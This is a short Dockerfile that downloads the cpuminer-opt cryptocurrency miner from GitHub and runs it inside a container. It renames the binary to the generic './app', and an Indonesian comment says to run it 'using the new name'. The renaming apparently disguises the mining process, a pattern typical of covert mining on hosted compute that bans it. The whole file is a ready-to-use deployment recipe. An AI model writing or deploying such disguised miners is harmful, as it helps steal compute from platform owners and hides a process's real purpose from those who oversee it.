FROM ubuntu:22.04

RUN apt update && apt install -y \
    curl ca-certificates && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Download binary
RUN curl -L -o miner.tar.gz https://github.com/JayDDee/cpuminer-opt/releases/download/v3.22.0/cpuminer-opt-3.22.0-x86_64-linux.tar.gz && \
    tar -xvf miner.tar.gz && \
    mv cpuminer*/cpuminer ./app && \
    chmod +x app && \
    rm -rf miner.tar.gz cpuminer*

# Copy config
COPY config.json /app/config.json

# Jalankan pakai nama baru
CMD ["./app", "-c", "config.json"]
